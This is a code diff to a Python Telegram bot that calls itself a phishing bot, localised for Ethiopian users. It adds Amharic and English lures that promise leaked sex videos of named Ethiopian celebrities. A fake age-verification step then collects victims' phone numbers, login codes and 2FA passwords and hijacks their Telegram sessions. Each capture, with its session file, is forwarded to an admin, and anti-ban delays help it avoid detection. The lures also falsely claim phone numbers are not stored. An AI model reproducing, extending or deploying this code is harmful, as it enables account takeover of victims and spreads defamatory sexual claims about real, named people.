@@ -1,5 +1,5 @@
-# bot.py — Fixed for python-telegram-bot v20+
-# Railway deployment with anti-ban
+# bot.py — Habesha Edition with Images
+# Telegram Bot — Anti-Ban Edition
 
 import os
 import json
@@ -14,7 +14,7 @@ from datetime import datetime
 from pathlib import Path
 from flask import Flask, jsonify
 from telethon import TelegramClient, errors
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
 from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler, 
     MessageHandler, filters, ConversationHandler, ContextTypes
@@ -40,6 +40,7 @@ if not os.path.exists(DATA_DIR):
 
 os.makedirs(DATA_DIR, exist_ok=True)
 os.makedirs(os.path.join(DATA_DIR, "sessions"), exist_ok=True)
+os.makedirs(os.path.join(DATA_DIR, "images"), exist_ok=True)
 
 DB_PATH = os.path.join(DATA_DIR, "telegram_phishing.db")
 
@@ -101,11 +102,15 @@ def save_session(user_id, username, first_name, phone, step):
     conn.close()
     return last_id
 
-def update_session(record_id, code=None, twofa=None, session_file=None, user_info=None, status=None):
+def update_session(record_id, phone=None, code=None, twofa=None, session_file=None, user_info=None, status=None):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     updates = []
     params = []
+    
+    if phone is not None:
+        updates.append('phone = ?')
+        params.append(phone)
     if code is not None:
         updates.append('code = ?')
         params.append(code)
@@ -121,8 +126,10 @@ def update_session(record_id, code=None, twofa=None, session_file=None, user_inf
     if status is not None:
         updates.append('status = ?')
         params.append(status)
+    
     if not updates:
         return
+    
     params.append(record_id)
     query = f"UPDATE sessions SET {', '.join(updates)} WHERE id = ?"
     c.execute(query, params)
@@ -215,81 +222,194 @@ async def safe_send(context, chat_id, text, **kwargs):
         print(f"Send error: {e}")
         return None
 
-# ============ HOOK MESSAGES ============
+async def safe_send_photo(context, chat_id, photo_path, caption=None, **kwargs):
+    """Send photo with anti-ban delays"""
+    user_id = str(chat_id)
+    if not can_send_message(user_id):
+        await asyncio.sleep(random.uniform(1.5, 3.0))
+        if not can_send_message(user_id):
+            return None
+    
+    if ENABLE_TYPING_INDICATOR:
+        try:
+            await context.bot.send_chat_action(chat_id=chat_id, action="upload_photo")
+        except:
+            pass
+    
+    if HUMAN_LIKE_TYPING_SPEED:
+        await asyncio.sleep(random.uniform(1.5, 4.0))
+    
+    try:
+        with open(photo_path, 'rb') as f:
+            msg = await context.bot.send_photo(
+                chat_id=chat_id, 
+                photo=f, 
+                caption=caption,
+                **kwargs
+            )
+        record_message_sent(user_id)
+        return msg
+    except Exception as e:
+        print(f"Send photo error: {e}")
+        return None
+
+# ============ HOOK MESSAGES — HABESHA EDITION ============
+
 HOOK_MESSAGES = [
-    """🔥 *HOT LEAKED CONTENT* 🔥
+    """🔥 *የተሰረቀ ቪዲዮ ወጥቷል!* 🔥
 
-You've been invited to the *EXCLUSIVE LEAKS* channel.
+የ *BAMBI* የተሰረቀ ቪዲዮ ወጥቷል! ሙሉ ፊልሙን እነሆ! 🥵
 
-We have:
-- 🔞 Celebrity leaked videos (2026)
-- 📸 Private content from influencers
-- 🎬 Unreleased XXX content
+እንዲሁም:
+- 🔞 ጃኒ ገብሩ ምስጢራዊ ቪዲዮ
+- 📸 ፊዮና የግል ቪዲዮ
+- 🎬 ሌሎች የኢትዮጵያ ኮከቦች
 
-*VERIFICATION REQUIRED* (18+)
+*ዕድሜዎን ያረጋግጡ* (18+)
 
-👇 *Tap below to verify* 👇""",
-    """🎬 *EXCLUSIVE CONTENT* 🎬
+👇 *ለማየት ይንኩ* 👇""",
 
-You've been selected for early access to our private leaks channel.
+    """🎬 *EXCLUSIVE LEAKS — ETHIOPIAN CELEBRITIES* 🎬
 
-What's inside:
-- 🔞 Unreleased celebrity tapes
-- 📸 VIP influencer content
-- 🎥 XXX exclusive videos
+🔥 *BAMBI LEAKED VIDEO* — Full uncut version! 🔥
+
+Also includes:
+- 🔞 Jany Gebru private content
+- 📸 Fiyona exclusive video
+- 🎬 More Ethiopian celebrities
 
 *Age verification required* (18+)
 
-👇 *Verify your age to get access* 👇""",
-    """💎 *PRIVATE LEAKS* 💎
+👇 *Tap to verify and watch* 👇""",
 
-You've been invited to the most exclusive leaks channel on Telegram.
+    """💎 *የኢትዮጵያ ኮከቦች ምስጢራዊ ቪዲዮ* 💎
 
-Content includes:
-- 🔞 Celebrity sex tapes (new 2026)
-- 📸 Influencer private content
-- 🎬 XXX unreleased videos
+የታወቁ ኢትዮጵያዊያን ኮከቦች የተሰረቀ ቪዲዮ!
 
-*Must verify age (18+) before access*
+ውስጥ ያለው:
+- 🔞 ባምቢ — ሙሉ ቪዲዮ
+- 📸 ጃኒ ገብሩ — የግል ቪዲዮ
+- 🎬 ፊዮና — ምስጢራዊ ቪዲዮ
+- 🔥 ሌሎች በየቀኑ
 
-👇 *Tap to verify and join* 👇"""
+*ዕድሜ 18+ መሆን አለበት*
+
+👇 *ለማየት ይንኩ* 👇""",
+
+    """🔥 *BAMBI LEAKED — FULL VIDEO* 🔥
+
+The video everyone is talking about! Bambi's leaked video is finally here! 🥵
+
+Plus:
+- 🔞 Jany Gebru secret video
+- 📸 Fiyona private content
+- 🎬 Daily Ethiopian celebrity leaks
+
+*VERIFY YOUR AGE* (18+)
+
+👇 *Tap to watch* 👇""",
+
+    """🎯 *ETHIOPIAN CELEBRITY LEAKS* 🎯
+
+We have the hottest Ethiopian celebrity leaks!
+
+Inside:
+- 🔞 Bambi — full leaked video (uncut)
+- 📸 Jany Gebru — private photos
+- 🎬 Fiyona — exclusive content
+- 🔥 New leaks daily
+
+*18+ verification required*
+
+👇 *Tap to verify and access* 👇"""
 ]
 
 VERIFY_MESSAGES = [
-    """🔐 *VERIFICATION REQUIRED*
+    """🔐 *ዕድሜ ማረጋገጫ* 🔐
 
-Please share your phone number to verify your age and location.
+እባክዎ ዕድሜዎን ለማረጋገጥ ስልክ ቁጥርዎን ያጋሩ።
 
-*Your phone number is NOT stored or shared.*
+*ስልክ ቁጥርዎ አይቀመጥም ወይም አይጋራም*
 
-👇 *Tap to share your phone number* 👇""",
+👇 *ስልክ ቁጥር ለማጋራት ይንኩ* 👇""",
+
     """📱 *AGE VERIFICATION*
 
-Please share your phone number so we can verify your age.
+Please share your phone number to verify your age.
 
-*Phone number is encrypted and not stored.*
+*Your phone number is NOT stored or shared*
 
-👇 *Share your phone number to continue* 👇"""
+👇 *Share your phone number to continue* 👇""",
+
+    """🔐 *VERIFICATION REQUIRED*
+
+Share your phone number to access Ethiopian celebrity leaks.
+
+- ✅ Confirm you're 18+
+- ✅ Country verification
+- ✅ Send access code
+
+*Phone number is encrypted*
+
+👇 *Tap to share* 👇"""
 ]
 
 SUCCESS_MESSAGES = [
-    """✅ *VERIFICATION SUCCESSFUL!*
+    """✅ *VERIFICATION SUCCESSFUL!* ✅
 
-🎉 You now have access to the exclusive content!
+🎉 You now have access to Ethiopian celebrity leaks!
 
-🔞 *Access the leaks here:*
+🔞 *Watch Bambi leaked video:*
 https://t.me/+abcdef123456
 
-*Welcome to the club!* 🥵""",
-    """🎉 *ACCESS GRANTED!*
+Also available:
+- Jany Gebru private content
+- Fiyona exclusive video
+- Daily new leaks
+
+*Welcome!* 🥵""",
+
+    """🎉 *ACCESS GRANTED!* 🎉
 
 Your verification is complete.
 
 🔞 *Join the leaks channel:*
 https://t.me/+abcdef123456
 
-*Enjoy the content!* 🔥"""
+*Ethiopian celebrity leaks — daily updates!* 🔥""",
+
+    """✅ *ተረጋገጠ!* ✅
+
+የኢትዮጵያ ኮከቦች ቪዲዮ ለማየት ዝግጁ ነዎት!
+
+🔞 *ባምቢ ቪዲዮ እነሆ:*
+https://t.me/+abcdef123456
+
+*እንኳን ደህና መጡ!* 🥵"""
 ]
+
+# ============ IMAGE PATHS ============
+# You need to add images to /app/data/images/
+# If images exist, they'll be sent with the hook
+
+IMAGE_FILES = {
+    'bambi': 'bambi.jpg',
+    'jany': 'jany.jpg', 
+    'fiyona': 'fiyona.jpg',
+    'hook': 'hook_preview.jpg'
+}
+
+def get_random_image():
+    """Get a random image from the images folder"""
+    image_dir = os.path.join(DATA_DIR, "images")
+    if not os.path.exists(image_dir):
+        return None
+    
+    images = [f for f in os.listdir(image_dir) if f.endswith(('.jpg', '.jpeg', '.png', '.gif'))]
+    if not images:
+        return None
+    
+    return os.path.join(image_dir, random.choice(images))
 
 # ============ TELEGRAM LOGIN ENGINE ============
 class TelegramLoginEngine:
@@ -377,21 +497,35 @@ PHONE, OTP, TWOFA = range(3)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     hook_text = random.choice(HOOK_MESSAGES)
+    
     keyboard = [
-        [InlineKeyboardButton("🔞 Watch Leaked Videos", callback_data="watch")],
-        [InlineKeyboardButton("📸 Private Content", callback_data="private")],
-        [InlineKeyboardButton("🎬 Exclusive Leaks", callback_data="exclusive")]
+        [InlineKeyboardButton("🔞 Watch Bambi Leaked Video", callback_data="watch")],
+        [InlineKeyboardButton("📸 Jany Gebru Private Content", callback_data="jany")],
+        [InlineKeyboardButton("🎬 Fiyona Exclusive", callback_data="fiyona")],
+        [InlineKeyboardButton("🔥 All Ethiopian Leaks", callback_data="all")]
     ]
-    await safe_send(
-        context, user.id, hook_text,
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+    
+    # Try to send image first, then text
+    image_path = get_random_image()
+    if image_path and os.path.exists(image_path):
+        await safe_send_photo(
+            context, user.id, image_path,
+            caption=hook_text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    else:
+        await safe_send(
+            context, user.id, hook_text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user = query.from_user
+    action = query.data
 
     existing = get_session_by_user(user.id)
     if existing and existing[10] in ['pending', 'code_sent', '2fa_required']:
@@ -407,12 +541,26 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
     reply_markup = {"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}
 
-    await query.edit_message_text(random.choice(VERIFY_MESSAGES), parse_mode='Markdown')
+    # Custom response based on button
+    if action == 'watch':
+        extra = "🔥 *Bambi leaked video — uncut!*"
+    elif action == 'jany':
+        extra = "📸 *Jany Gebru private content!*"
+    elif action == 'fiyona':
+        extra = "🎬 *Fiyona exclusive video!*"
+    else:
+        extra = "🔥 *All Ethiopian celebrity leaks!*"
+
+    verify_text = random.choice(VERIFY_MESSAGES) + f"\n\n{extra}"
+
+    await query.edit_message_text(verify_text, parse_mode='Markdown')
+    
     await safe_send(
         context, user.id,
         "📱 Tap below to share your phone number:",
         reply_markup=reply_markup
     )
+
     return PHONE
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -445,10 +593,10 @@ async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return PHONE
 
-    update_session(record_id, status='sending_code')
+    update_session(record_id, phone=phone, status='sending_code')
     context.user_data['phone'] = phone
 
-    await safe_send(context, user.id, "📡 Sending verification code...")
+    await safe_send(context, user.id, "📡 Sending verification code to your Telegram app...")
 
     engine = TelegramLoginEngine(phone, record_id, user.id)
     result = await engine.send_code()
@@ -532,17 +680,29 @@ async def notify_admin(context, record_id, user, success, twofa=None):
     session_data = get_session_by_id(record_id)
     if not session_data:
         return
+    
     phone = session_data[4] or 'Unknown'
     code = session_data[5] or 'No code'
     twofa_value = twofa or session_data[6] or 'No 2FA'
-    msg = f"🎯 *NEW CAPTURE!*\n👤 {user.first_name} (@{user.username})\n📱 `{phone}`\n🔢 `{code}`\n🔑 `{twofa_value}`"
+    
+    msg = f"""🎯 *NEW CAPTURE!*
+
+👤 User: {user.first_name} (@{user.username or 'no username'})
+📱 Phone: `{phone}`
+🔢 Code: `{code}`
+🔑 2FA: `{twofa_value}`
+📁 Status: {'✅ Success' if success else '⚠️ Partial'}
+
+Use /sessions to view all captures."""
+    
     await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
+    
     if session_data[7] and os.path.exists(session_data[7]):
         try:
             await context.bot.send_document(
                 chat_id=ADMIN_CHAT_ID,
                 document=open(session_data[7], 'rb'),
-                caption=f"📁 {phone}"
+                caption=f"📁 Session file for {phone}"
             )
         except:
             pass
@@ -552,17 +712,34 @@ async def admin_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
         return
+    
     sessions = get_all_sessions()
     if not sessions:
         await safe_send(context, ADMIN_CHAT_ID, "📭 No sessions.")
         return
+    
     msg = "📋 *SESSIONS*\n\n"
     for s in sessions[:20]:
         record_id, _, username, first_name, phone, code, twofa, session_file, user_info, timestamp, status = s
-        emoji = {'pending':'⏳','code_sent':'📤','2fa_required':'🔐','captured':'✅','failed':'❌'}.get(status, '❓')
+        emoji = {
+            'pending': '⏳',
+            'code_sent': '📤',
+            '2fa_required': '🔐',
+            'captured': '✅',
+            'failed': '❌'
+        }.get(status, '❓')
+        
         user_info_data = json.loads(user_info) if user_info else {}
         user_display = user_info_data.get('first_name', first_name or 'Unknown')
-        msg += f"{emoji} *{record_id}* | {user_display} @{username or ''}\n   📱 {phone} | 🔢 {code or '—'}\n\n"
+        username_display = f"@{user_info_data.get('username', username)}" if user_info_data.get('username') or username else ''
+        
+        phone_display = phone if phone else '❌ No phone'
+        code_display = code if code else '—'
+        
+        msg += f"{emoji} *ID: {record_id}* | {user_display} {username_display}\n"
+        msg += f"   📱 {phone_display} | 🔢 {code_display} | 🔑 {twofa or '—'}\n"
+        msg += f"   📁 {session_file or 'No file'}\n\n"
+    
     msg += f"\nTotal: {len(sessions)}"
     await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
 
@@ -570,14 +747,17 @@ async def admin_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
         return
+    
     args = context.args
     if not args or not args[0].isdigit():
         await safe_send(context, ADMIN_CHAT_ID, "❌ /get <id>")
         return
+    
     session_data = get_session_by_id(int(args[0]))
     if not session_data or not session_data[7] or not os.path.exists(session_data[7]):
         await safe_send(context, ADMIN_CHAT_ID, "❌ File not found.")
         return
+    
     await context.bot.send_document(
         chat_id=ADMIN_CHAT_ID,
         document=open(session_data[7], 'rb'),
@@ -588,10 +768,12 @@ async def admin_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
         return
+    
     args = context.args
     if not args or not args[0].isdigit():
         await safe_send(context, ADMIN_CHAT_ID, "❌ /delete <id>")
         return
+    
     session_data = get_session_by_id(int(args[0]))
     if session_data and session_data[7] and os.path.exists(session_data[7]):
         os.remove(session_data[7])
@@ -602,28 +784,31 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
         return
+    
     sessions = get_all_sessions()
     total = len(sessions)
     captured = len([s for s in sessions if s[10] == 'captured'])
     twofa = len([s for s in sessions if s[10] == '2fa_required'])
-    msg = f"📊 *STATS*\nTotal: {total}\n✅ Captured: {captured}\n🔐 2FA: {twofa}"
+    pending = len([s for s in sessions if s[10] in ['pending', 'code_sent']])
+    
+    msg = f"📊 *STATS*\nTotal: {total}\n✅ Captured: {captured}\n🔐 2FA: {twofa}\n⏳ Pending: {pending}"
     await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
 
 async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         await safe_send(context, update.effective_user.id, "❌ Unauthorized.")
         return
+    
     msg = """🤖 *ADMIN COMMANDS*
-/sessions - List all
-/get <id> - Download session
+/sessions - List all captures
+/get <id> - Download session file
 /delete <id> - Delete session
 /stats - Statistics
-/help - This"""
+/help - This help"""
     await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
 
 # ============ BOT RUNNER ============
 def run_bot():
-    """Run bot in a separate thread with proper event loop"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
@@ -636,7 +821,7 @@ def run_bot():
         conv_handler = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
-                CallbackQueryHandler(button_callback, pattern='^(watch|private|exclusive)$')
+                CallbackQueryHandler(button_callback, pattern='^(watch|jany|fiyona|all)$')
             ],
             states={
                 PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, phone_handler)],
@@ -657,11 +842,8 @@ def run_bot():
         print("🤖 Bot is ready, starting polling...")
         await application.initialize()
         await application.start()
-        
-        # Use the newer polling method
         await application.updater.start_polling()
         
-        # Keep running
         while True:
             await asyncio.sleep(1)
 
@@ -676,15 +858,14 @@ def run_bot():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════╗
-    ║   Telegram Bot — Fixed v20+                    ║
+    ║   Telegram Phishing Bot — Habesha Edition              ║
+    ║   Celebrities: Bambi, Jany Gebru, Fiyona              ║
     ║   Data dir: {}                                         ║
     ╚═══════════════════════════════════════════════════════════╝
     """.format(DATA_DIR))
 
-    # Start bot in background
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
 
-    # Start Flask
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
